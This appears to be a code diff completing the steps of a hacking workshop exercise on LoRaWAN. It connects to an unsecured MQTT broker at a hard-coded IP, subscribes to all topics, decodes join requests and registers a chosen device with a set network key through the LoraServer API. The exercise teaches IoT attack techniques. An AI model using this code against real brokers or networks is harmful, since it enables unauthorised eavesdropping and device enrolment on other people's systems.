@@ -1,7 +1,7 @@
 const api = require('./api/api');
 const utils = require('./utils');
 const mqtt = require('mqtt');
-
+const Logger = require('./log/logger');
 const JoinRequestPacketDecoder = require('./join-request-packet-decoder');
 
 const GATEWAY_RX_TOPIC_REGEX = new RegExp("^gateway/([0-9a-fA-F]+)/rx$");
@@ -11,11 +11,14 @@ const LORA_APPLICATION_ID = 1;
 const VALID_APP_EUI = utils.hexStringToBytes('42:42:42:42:42:42:42:42');
 
 // TODO Step 0
-const DEVICE_EUI = utils.hexStringToBytes('TODO');// Put your Device EUI here
-const DEVICE_NETWORK_KEY = utils.normalizeHexString("42:42:42:42:42:42:42:42:42:42:42:42:42:42:42:42");
+const DEVICE_EUI = utils.hexStringToBytes("13:37:00:00:FF:FF:FF:00");
+const DEVICE_NETWORK_KEY = "42424242424242424242424242424242";
 
+const logger = Logger.child({service: 'index'});
 
- /**
+let client;
+
+/**
  * Step 1
  */
 let init = () => {
@@ -26,6 +29,12 @@ let init = () => {
 // Those idiots forgot to put any security on it... Noobs!
 // MQTT Client documentation => https://github.com/mqttjs/MQTT.js
 // You want to listen to all incoming messages... Did I hear the word "Wildcard"?
+  client = mqtt.connect('mqtt://5.135.162.148:1883', {clientId: 'hacker-1234'});
+  client.on('connect', () => {
+    logger.info("Connected to broker!");
+    client.subscribe("#");
+  });
+  client.on("message", onMessage);
 };
 
 /**
@@ -46,11 +55,9 @@ let onMessage = async (topic, message) => {
   if (!msgDecoder.isSupported()) {
     return;
   }
-  
   logger.debug("Join Request identified");
   let decodedJoinRequest = msgDecoder.decode();
   logger.debug("Decoded:" + JSON.stringify(decodedJoinRequest));
-  
   // Congratulations, you are decoding all the join requests of the LoRa network.
   // However, we want to be smart hackers and only activate your friend's device on the specific APP_EUI 
   if (isValidAppEUI(decodedJoinRequest.appEUI) && isRightDeviceEUI(decodedJoinRequest.devEUI)) {
@@ -62,9 +69,25 @@ let onMessage = async (topic, message) => {
     // and your sysadmin needs to whitelist your computer's mac address).
     // Therefore we want to interact with the LoraServer API.
     // Thanks to your awesome friend John Doe, you already have a async-client available in api/api.js
-    // TODO Step 3.1: register your friend's device remotely.
-    // TODO Step 3.2: set the device Network key (NwkKey).
-    logger.debug("Device registered successfully");
+    // TODO Step 3.1: register your friend's device remotely
+    try {
+      if (!await api.deviceExists(decodedJoinRequest.devEUI)) {
+        await api.createDevice({
+          devEUI: decodedJoinRequest.devEUI,
+          applicationID: LORA_APPLICATION_ID,
+          deviceProfileID: RAK811_DEVICE_PROFILE_ID,
+          name: "Test",
+          description: "Test description"
+        });
+      }
+      // TODO Step 3.2: set the device Network key (NwkKey).
+      await api.setDeviceNwkKey(decodedJoinRequest.devEUI, DEVICE_NETWORK_KEY);
+      logger.debug("Device registered successfully");  
+    } catch (e) {
+      logger.error("Error occured during device registration:");
+      logger.error(e);
+    }
+    
   }
 };
 
